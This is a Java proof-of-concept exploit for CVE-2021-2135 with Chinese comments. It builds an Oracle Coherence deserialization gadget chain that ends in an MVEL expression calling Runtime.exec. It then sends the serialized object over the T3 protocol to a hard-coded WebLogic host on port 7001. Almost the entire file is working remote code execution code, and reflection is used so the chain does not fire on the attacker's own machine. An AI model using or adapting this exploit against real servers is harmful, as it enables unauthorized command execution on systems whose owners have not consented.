package com.supeream;

import com.sun.org.apache.xpath.internal.objects.XString;
import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
import com.tangosol.coherence.servlet.AttributeHolder;
import com.tangosol.internal.util.SimpleBinaryEntry;
import com.tangosol.io.DefaultSerializer;
import com.tangosol.io.Serializer;
import com.tangosol.util.*;
import com.tangosol.util.aggregator.TopNAggregator;
import com.tangosol.util.filter.MapEventFilter;
import com.tangosol.util.processor.ConditionalPutAll;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.AbstractMap;
import java.util.Map;

/**
 * @author ga0weI
 * @time 20220621
 * work for cve-2021-2135, refer to R17a
 */
public class Cve_2021_2135_1 {
    public static void main(String[] args) throws Exception {
//        final String command = args[1];
        String host = "192.168.129.142";
//         最终的执行载体
//         执行没有结果时会返回ProcessImpl实例，poc会将结果转为Comparable，ProcessImpl实例不能转换所以会报错，因此这里返回一个Integer类型的数据
//        MvelExtractor extractor1 = new MvelExtractor("java.lang.Runtime.getRuntime().exec("calc");return new Integer(1);");
        String payload = "java.lang.Runtime.getRuntime().exec(\"touch /tmp/0621_cve20212135xxx\");return new Integer(1);";
//        String payload = "java.lang.Runtime.getRuntime().exec(\"calc\");return new Integer(1);";
        MvelExtractor extractor1 = new MvelExtractor(payload);
        MvelExtractor extractor2 = new MvelExtractor("");
// 序列化入口        AttributeHolder attributeHolder = new AttributeHolder();
        SortedBag partialResult = new TopNAggregator.PartialResult(extractor2, 2);
        partialResult.add(1);
        setField("m_comparator", partialResult, extractor1);

        // 这里bin_Key必须用ExternalizableHelper.writeObject赋值，不能用partialResult.writeExternal(dataOutputStream1);
        // 因为使用partialResult.writeExternal最终不会调用partialResult.readExternal，只会写m_comparator，不写partialResult自身
        ByteArrayOutputStream baos1 = new ByteArrayOutputStream();
        DataOutputStream dataOutputStream1 = new DataOutputStream(baos1);
        ExternalizableHelper.writeObject(dataOutputStream1, partialResult);

        ByteArrayOutputStream baos2 = new ByteArrayOutputStream();
        DataOutputStream dataOutputStream2 = new DataOutputStream(baos2);
        ExternalizableHelper.writeObject(dataOutputStream2, new Integer(0));
        Binary key = new Binary(baos1);        Binary value = new Binary(baos2);

        SimpleBinaryEntry simpleBinaryEntry = new SimpleBinaryEntry(key,value);
        Serializer m_serializer= new DefaultSerializer();
        simpleBinaryEntry.setContextSerializer(m_serializer);

        // 调用xString.equals(simpleBinaryEntry)可触发SimpleBinaryEntry#toString，所以map按顺序先加入simpleBinaryEntry，再加入xString
        LiteMap liteMap = new LiteMap();
        liteMap.put(simpleBinaryEntry,1);
        //        liteMap.put(new XString(null),2);
        //        直接put会在本地触发,反射写进去
        byte bt = 3;
        Map.Entry[] arrayOfEntry1 = new Map.Entry[8];
        Map.Entry entry = (Map.Entry) getField("m_oContents",liteMap);
        arrayOfEntry1[0] = entry;
        arrayOfEntry1[1] = new AbstractMap.SimpleEntry(new XString(null), 2);
        setField("m_nImpl", liteMap, bt);
        setField("m_oContents",liteMap,  arrayOfEntry1);
        //ConditionalPutAll conditionalPutAll = new ConditionalPutAll(new MapEventFilter(), liteMap);
        //同理,直接new会putall,也会本地触发,反射写进去
        ConditionalPutAll conditionalPutAll = new ConditionalPutAll(new MapEventFilter(), new LiteMap());
        setField("m_map",conditionalPutAll, liteMap );
        // 序列化入口
        AttributeHolder attributeHolder = new AttributeHolder();
        Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue", Object.class);
        setInternalValue.setAccessible(true);
        setInternalValue.invoke(attributeHolder, conditionalPutAll);
        //调用setInternalValue方法设置m_oValue属性为conditionalPutAll
        T3ProtocolOperation.send(host, "7001", Serializables.serialize(attributeHolder));
        //Utils.deserialize();
    }
    public static void setField(String fieldName, Object target, Object fieldValue) throws Exception {
        Field field = null;
        try {
            field = target.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException var4) {
            if (target.getClass().getSuperclass() != null)
                field = target.getClass().getSuperclass().getDeclaredField(fieldName);
        }
        field.setAccessible(true);
        field.set(target, fieldValue);
    }
    public static Object getField(String fieldName, Object target) throws Exception {
        Field field = null;
        try {
            field = target.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException var4) {
            if (target.getClass().getSuperclass() != null)
                field = target.getClass().getSuperclass().getDeclaredField(fieldName);
        }
        field.setAccessible(true);
        Object o = field.get(target);
        return o;
    }
}